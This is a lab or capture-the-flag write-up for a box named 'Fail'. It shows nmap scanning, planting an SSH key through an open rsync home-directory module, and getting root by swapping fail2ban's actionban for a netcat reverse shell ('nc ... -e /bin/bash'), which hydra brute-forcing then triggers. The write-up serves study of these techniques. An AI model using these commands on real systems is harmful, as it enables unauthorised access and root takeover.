# Fail

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.243.126
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 21:08 +08
Nmap scan report for 192.168.243.126
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync
```

Rsync was the only thing available.

### Rsync Enum -> SSH

Hacktricks has a whole page for RSync we can follow:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync" %}

We can first do further enumeration on the modules available:

```
$ nmap -sV --script "rsync-list-modules" -p 873 192.168.243.126
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 21:09 +08
Nmap scan report for 192.168.243.126
Host is up (0.17s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```

`fox` might be the user present on the machine. We can list the files present:

```
$ rsync -av --list-only rsync://fox@192.168.243.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 22:21:59 .
lrwxrwxrwx              9 2020/12/04 04:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 12:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 12:12:36 .bashrc
-rw-r--r--            807 2019/04/18 12:12:36 .profile
```

What we do is create a new `.ssh` directory and place our public key within it:

```bash
mkdir .ssh
chmod 700 .ssh
cp ~/.ssh/id_rsa.pub .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

Then, transfer it to the machine:

```
$ rsync -av .ssh rsync://fox@192.168.243.126/fox
sending incremental file list
.ssh/
.ssh/authorized_keys

sent 534 bytes  received 67 bytes  240.40 bytes/sec
total size is 391  speedup is 0.65
```

Then, we can `ssh` in:

<figure><img src="../../../.gitbook/assets/image (3478).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Fail2ban -> Root

The user is able to edit the `fail2ban` configuration files to execute commands as `root` since `fox` is part of that group.&#x20;

We just need to create a malicious `iptables-multiport.conf` file like this:

```
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = nc 192.168.45.231 80 -e /bin/bash
# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]

```

Afterwards, replace the actual file with our malicious one, where the `actionban` has been edited.&#x20;

```
fox@fail:/etc/fail2ban/action.d$ rm iptables-multiport.conf
fox@fail:/etc/fail2ban/action.d$ wget 192.168.45.231:21/iptables-multiport.conf
--2023-07-17 09:23:58--  http://192.168.45.231:21/iptables-multiport.conf
Connecting to 192.168.45.231:21... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1401 (1.4K) [application/octet-stream]
Saving to: ‘iptables-multiport.conf’

iptables-multiport.conf 100%[============================>]   1.37K  --.-KB/s    in 0s      

2023-07-17 09:23:59 (183 MB/s) - ‘iptables-multiport.conf’ saved [1401/1401]
```

To trigger it, just generate a lot of `ssh` tries with `hydra`:

```
$ hydra -l fox -P /usr/share/wordlists/rockyou.txt 192.168.243.126 ssh
```

We would then get a reverse shell back as `root`:

<figure><img src="../../../.gitbook/assets/image (3477).png" alt=""><figcaption></figcaption></figure>
